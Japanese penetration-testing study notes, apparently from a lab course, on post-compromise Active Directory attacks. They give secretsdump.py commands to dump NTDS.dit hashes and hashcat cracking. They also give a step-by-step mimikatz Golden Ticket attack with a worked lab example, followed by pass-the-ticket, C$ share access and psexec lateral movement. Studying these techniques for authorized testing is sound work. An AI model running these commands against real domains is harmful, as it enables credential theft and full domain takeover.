もし、早くにDCを侵害できたとしても、他の脆弱性を探すか、NTDS.ditを取得する
取得して、こんなのが取れたと言えることが大事
- それらが、ネットワーク上に必要ない場合があるなら取り除く
- DCに不正にログインしたことに気づいて、アカウントを無効化されても大丈夫なように他のDCアカウントをしっかり作っておく
- また、検出できているのか、検出できていないのかを顧客と確認する
- そして、ペネトレが終わったら必ず、クリーンアップする
	- 新しいアカウントを作ったら、それが脆弱性として簡単にしてしまう場合があるから

# NTDS.dit
- ADデータを保存するためのDatabase
- ユーザー情報
- グループ情報
- セキュリティの説明
- パスワードハッシュ

secretsdump.pyでNTDS.ditに含まれる情報のみを取得する
```sh
secretsdump.py <domain>/<user>:<Password>@ターゲットマシンIP -just-dc-ntlm
```

クラックするのは、NTハッシュだけ
hashcatでクラックできる
Tips
- [[3_Initial_AD_Attack_Vectors#hashcat]]

# ゴールデンチケット攻撃
- KRBTGTアカウントを取得できたら、ドメイン全体を奪取できたことになる
- KRBTGT
	- Kereberosチケットを発行するためのチケット
	- チケットを好きなように発行できる
	- ドメイン下のどのマシン・リソースにもアクセスできるし、他のドメインへの足がかりにもなるかも

取得方法
## Mimikatz
- LSAダンプから、KRBTGTアカウントを取得できる
- 必要なもの
	- KRBTGT NTLMハッシュ
	- ドメインSID
- 両方を取得できたら、ゴールデンチケットを生成できる
- ゴールデンチケットを生成したら、PtTで、どこでも使える

### 必要なものの抽出
mimikatzの実行
```sh
C:~ > mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::lsa /inject /name:krbtgt
```

必要なもの
- ドメインSID
```sh
Domain : MARVEL / s-1-5-21.....
```

- krbtgtのNTLMハッシュ
```sh
User : krtbtgt

* Primary
	NTLM : ........
```

### ゴールデンチケットの生成と利用
 ゴールデンチケット（Golden Ticket） を生成し、/ptt オプションでそのチケットを現在のセッションにインジェクト（Pass-the-Ticket）する
```sh
mimikatz # kerberos::golden /user:Administrator /domain:<ドメイン名> /sid:<上で取得したsid> /krbtgt:<上で取得したkrbtgtのNTLMハッシュ> /id:500 /ptt
```

実際の例
```sh
mimikatz # kerberos::golden /user:Administrator /domain:marvel.local /sid:S-1-5-21-301214212-320777931-1277971883 /krbtgt:11f843aafd22acfb29aef92f6e423994 /id:500 /ptt
```

Mimikatz内から新しいコマンドプロンプト（cmd.exe）を開く
- 直前に /ptt でインジェクトしたゴールデンチケットを「引き継いだ状態」でコマンドを実行できる
```sh
mimikatz # misc::cmd
```

DCから、AD内の他のホスト内のファイルも参照できる
```sh
C\ ~> dir \\<AD内のホスト名>\c$
```
そして、psexec.exeをダウンロードさせれば、krbtgtとしてリモート接続できる
シルバーチケット攻撃もある